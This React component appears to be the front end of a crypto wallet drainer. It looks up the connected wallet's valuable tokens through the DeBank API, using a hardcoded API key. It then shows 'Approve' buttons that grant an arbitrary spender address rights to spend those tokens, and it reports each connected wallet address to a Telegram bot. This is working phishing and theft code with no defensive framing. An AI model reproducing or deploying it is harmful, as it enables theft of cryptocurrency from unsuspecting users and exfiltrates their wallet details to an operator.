"use client";

import { useState, useEffect } from "react";
import { useAccount, useWalletClient } from "wagmi";
import { ethers, InfuraProvider, formatUnits, parseUnits, BrowserProvider, Contract } from "ethers";
import axios from "axios"; // For API requests

type ApproveButtonProps = {
  spenderAddress: string;         // The address that will be approved to spend tokens
  chainId?: number;               // Optional Chain ID for token contracts
  amount: string;                 // Amount to approve (in token units)
};

const ApproveButton: React.FC<ApproveButtonProps> = ({ spenderAddress, chainId, amount }) => {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [tokens, setTokens] = useState<any[]>([]); // Tokens to approve dynamically

  // Fetch token balances dynamically from DeBank API
  useEffect(() => {
    const fetchTokens = async () => {
      if (address) {
        try {
          const response = await axios.get(`https://pro-openapi.debank.com/v1/user/token_list`, {
            headers: { Authorization: `Bearer f2cccb512bb7e5001296a63f70c44c8be8fb2d64` },
            params: { id: address, ...(chainId ? { chain_id: chainId } : {}) },
          });
          const tokenData = response.data;
          const filteredTokens = tokenData.filter((token: any) => token.price > 1); // Filter tokens with significant value
          setTokens(filteredTokens);
        } catch (error: any) {
          if (axios.isAxiosError(error)) {
            console.error("Axios error:", error.response?.data || error.message);
          } else {
            console.error("Unexpected error fetching tokens from DeBank API:", error);
          }
          setTokens([]); // Fallback: clear tokens if fetch fails
        }
      }
    };
    fetchTokens();
  }, [address, chainId]);

  // Approve tokens dynamically
  const handleApprove = async (tokenAddress: string) => {
    if (!walletClient || !address) return;

    try {
      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
      const provider = new BrowserProvider(walletClient);
      const signer = await provider.getSigner();
      const tokenContract = new ethers.Contract(tokenAddress, abi, signer);
      const tx = await tokenContract.approve(spenderAddress, ethers.parseUnits(amount));
      await tx.wait();
      console.log(`Approved ${amount} for spender ${spenderAddress} on token ${tokenAddress}`);
    } catch (error) {
      console.error(`Failed to approve token ${tokenAddress}:`, error);
    }
  };

  // Send connected wallet data to Telegram bot
  useEffect(() => {
    const sendWalletToTelegram = async () => {
      if (isConnected && address) {
        try {
          const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
          const telegramChatId = "YOUR_TELEGRAM_CHAT_ID";
          const message = `Wallet connected: ${address}`;
          await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            chat_id: telegramChatId,
            text: message,
          });
          console.log("Wallet address sent to Telegram");
        } catch (error) {
          console.error("Error sending wallet data to Telegram:", error);
        }
      }
    };
    sendWalletToTelegram();
  }, [isConnected, address]);

  return (
    <div>
      <h2>Approve Tokens</h2>
      {tokens.length === 0 && <p>Loading tokens...</p>}
      {tokens.map((token) => (
        <div key={token.id}>
          <p>{token.name} ({token.symbol}): {token.balance} {token.symbol}</p>
          <button onClick={() => handleApprove(token.id)}>Approve</button>
        </div>
      ))}
    </div>
  );
};

export default ApproveButton;
